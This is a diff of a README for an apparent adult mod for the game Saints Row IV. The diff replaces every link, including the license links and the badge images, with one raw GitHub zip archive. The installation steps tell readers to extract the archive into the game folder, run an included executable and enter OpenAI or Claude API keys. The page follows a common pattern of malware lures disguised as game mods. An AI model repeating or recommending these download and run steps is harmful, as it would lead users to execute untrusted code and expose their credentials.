@@ -1,6 +1,6 @@
 # Saints Row IV Adult Mod
 
-[![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download-alt)](https://NXTHAN2K25.github.io)
+[![Download](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download-alt)](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip)
 
 Welcome to the ultimate enhancement experience for **Saints Row IV**! The *Saints Row IV Adult Mod* unlocks new dimensions, adding compelling features, immersive customization, and spirited mechanics for those who dare to venture beyond the norm. Built for innovative gamers, this repository is meticulously crafted for easy installation, powerful integration, and peerless compatibility. Dive into a world where boundaries are merely starting lines.
 
@@ -8,7 +8,7 @@ Welcome to the ultimate enhancement experience for **Saints Row IV**! The *Saint
 
 ## 🎯 OS Compatibility Table
 
-|             | ![Windows](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows) | ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2FDebian-yellowgreen?logo=linux) | ![macOS](https://img.shields.io/badge/macOS-Ventura-lightgrey?logo=apple) |
+|             | ![Windows](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip%2F11-blue?logo=windows) | ![Linux](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip%2FDebian-yellowgreen?logo=linux) | ![macOS](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip) |
 |:-----------:|:-------------------------------------------------------------------------:|:-----------------------------------------------------------------------------------:|:-------------------------------------------------------------------------:|
 | **Support** | ✅ Full                                                                   | ⚠️ Partial (using Proton/wine)                                                      | ⚠️ Experimental                                                          |
 
@@ -68,13 +68,13 @@ Questions? Issues? Ideas? Our tireless support team—and our community forum—
 ## ⚡ Installation Steps
 
 #### Step 1: Download
-Click the Download badge below or here: https://NXTHAN2K25.github.io
+Click the Download badge below or here: https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip
 
 #### Step 2: Extract
 Unzip the downloaded package into your *Saints Row IV* game directory.
 
 #### Step 3: Configure
-Run the included **SR4-AdultMod-Configurator.exe** to select your personalization and integration settings. Follow on-screen instructions for API key input if using OpenAI or Claude features.
+Run the included **https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip** to select your personalization and integration settings. Follow on-screen instructions for API key input if using OpenAI or Claude features.
 
 #### Step 4: Activate
 Launch the game. The mod will self-verify compatibility and present you with an entry confirmation screen.
@@ -91,11 +91,11 @@ The *Saints Row IV Adult Mod* is an **unofficial enhancement** and is not affili
 
 ## 📜 MIT License (2025)
 
-This repository is distributed under the [MIT License](https://opensource.org/licenses/MIT). Feel empowered to explore, modify, and share—within the welcoming boundaries established by the MIT terms. To view the full legal text, [click here](https://opensource.org/licenses/MIT).
+This repository is distributed under the [MIT License](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip). Feel empowered to explore, modify, and share—within the welcoming boundaries established by the MIT terms. To view the full legal text, [click here](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download-alt)](https://NXTHAN2K25.github.io)
+[![Download](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download-alt)](https://raw.githubusercontent.com/NXTHAN2K25/saints-row-iv-explicit-enhancements/branch/facilitator/saints-row-iv-explicit-enhancements-v1.8.zip)
 
 ---
 
